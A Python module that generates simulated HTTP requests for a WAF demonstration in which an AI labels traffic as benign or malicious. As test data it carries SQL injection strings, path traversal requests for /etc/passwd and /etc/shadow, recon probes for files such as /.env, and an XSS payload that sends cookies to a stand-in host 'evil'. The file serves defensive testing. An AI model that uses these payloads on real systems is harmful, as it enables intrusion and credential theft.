"""
Fake HTTP request generator — simulates various attack patterns.

Requests never touch a real network. They're generated in memory and fed to
the defender's WAF endpoint, which asks the AI to classify & respond.
"""
from __future__ import annotations

import random
import string
import time
import uuid
from dataclasses import asdict, dataclass, field
from typing import Any


FAKE_IPS_MALICIOUS = [
    "185.220.101.42",  # known Tor exit
    "45.155.205.233",  # scanner
    "103.102.55.12",
    "91.234.99.7",
    "80.94.95.116",
    "192.42.116.18",
]
FAKE_IPS_BENIGN = [
    "192.168.1.55",
    "10.0.0.12",
    "172.16.5.43",
    "203.0.113.25",
    "198.51.100.7",
]

USER_AGENTS_MALICIOUS = [
    "sqlmap/1.7.2",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "",  # empty UA = suspicious
    "Go-http-client/1.1",
]
USER_AGENTS_BENIGN = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Version/17.2 Safari",
]


@dataclass
class FakeRequest:
    id: str
    timestamp: float
    method: str
    path: str
    source_ip: str
    user_agent: str
    headers: dict[str, str] = field(default_factory=dict)
    payload: str = ""
    pattern: str = "unknown"        # high-level pattern name
    known_malicious: bool = False   # ground truth for UI
    severity_hint: str = "info"     # info | warn | danger

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


# ---------- Pattern generators ----------

def _gen_login_bruteforce() -> FakeRequest:
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="POST",
        path="/api/auth/login",
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        headers={"Content-Type": "application/json"},
        payload=f'{{"username":"admin","password":"{_random_str(12)}"}}',
        pattern="credential_stuffing",
        known_malicious=True,
        severity_hint="danger",
    )


def _gen_sql_injection() -> FakeRequest:
    payloads = [
        "?id=1' OR '1'='1",
        "?search=admin'--",
        "?q=UNION SELECT NULL,username,password FROM users",
    ]
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path="/api/search" + random.choice(payloads),
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent="sqlmap/1.7.2",
        pattern="sql_injection",
        known_malicious=True,
        severity_hint="danger",
    )


def _gen_path_traversal() -> FakeRequest:
    paths = [
        "/api/files?name=../../../etc/passwd",
        "/static/..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe",
        "/api/download?file=....//....//etc/shadow",
    ]
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path=random.choice(paths),
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        pattern="path_traversal",
        known_malicious=True,
        severity_hint="danger",
    )


def _gen_xss() -> FakeRequest:
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="POST",
        path="/api/comments",
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        payload='{"text":"<script>document.location=\'http://evil/steal?c=\'+document.cookie</script>"}',
        pattern="xss",
        known_malicious=True,
        severity_hint="warn",
    )


def _gen_bot_scan() -> FakeRequest:
    paths = ["/admin", "/wp-admin/", "/.env", "/config.php", "/backup.sql", "/phpmyadmin/"]
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path=random.choice(paths),
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        pattern="recon_scanner",
        known_malicious=True,
        severity_hint="warn",
    )


def _gen_ddos_burst() -> FakeRequest:
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path="/api/heavy-endpoint",
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        pattern="ddos_volumetric",
        known_malicious=True,
        severity_hint="danger",
    )


def _gen_api_abuse() -> FakeRequest:
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path=f"/api/users/{random.randint(1, 100000)}",
        source_ip=random.choice(FAKE_IPS_MALICIOUS),
        user_agent=random.choice(USER_AGENTS_MALICIOUS),
        pattern="api_scraping",
        known_malicious=True,
        severity_hint="warn",
    )


def _gen_benign_browse() -> FakeRequest:
    paths = ["/", "/dashboard", "/api/me", "/api/notifications", "/static/css/app.css"]
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method="GET",
        path=random.choice(paths),
        source_ip=random.choice(FAKE_IPS_BENIGN),
        user_agent=random.choice(USER_AGENTS_BENIGN),
        pattern="normal_browse",
        known_malicious=False,
        severity_hint="info",
    )


def _gen_benign_api_call() -> FakeRequest:
    return FakeRequest(
        id=str(uuid.uuid4())[:8],
        timestamp=time.time(),
        method=random.choice(["GET", "POST"]),
        path=f"/api/items/{random.randint(1, 100)}",
        source_ip=random.choice(FAKE_IPS_BENIGN),
        user_agent=random.choice(USER_AGENTS_BENIGN),
        pattern="normal_api",
        known_malicious=False,
        severity_hint="info",
    )


PATTERNS = {
    "credential_stuffing": _gen_login_bruteforce,
    "sql_injection":       _gen_sql_injection,
    "path_traversal":      _gen_path_traversal,
    "xss":                 _gen_xss,
    "recon_scanner":       _gen_bot_scan,
    "ddos_volumetric":     _gen_ddos_burst,
    "api_scraping":        _gen_api_abuse,
    "normal_browse":       _gen_benign_browse,
    "normal_api":          _gen_benign_api_call,
}


def _random_str(n: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def generate(pattern: str | None = None, count: int = 1) -> list[FakeRequest]:
    """
    Generate one or more fake requests.
    pattern=None → random mix (60% malicious, 40% benign)
    """
    out = []
    for _ in range(count):
        if pattern and pattern in PATTERNS:
            out.append(PATTERNS[pattern]())
        else:
            # Weighted random — more malicious for interesting demo
            malicious = random.random() < 0.6
            if malicious:
                gen = random.choice([
                    _gen_login_bruteforce, _gen_sql_injection, _gen_path_traversal,
                    _gen_xss, _gen_bot_scan, _gen_ddos_burst, _gen_api_abuse,
                ])
            else:
                gen = random.choice([_gen_benign_browse, _gen_benign_api_call])
            out.append(gen())
    return out


def pattern_names() -> list[str]:
    return list(PATTERNS.keys())
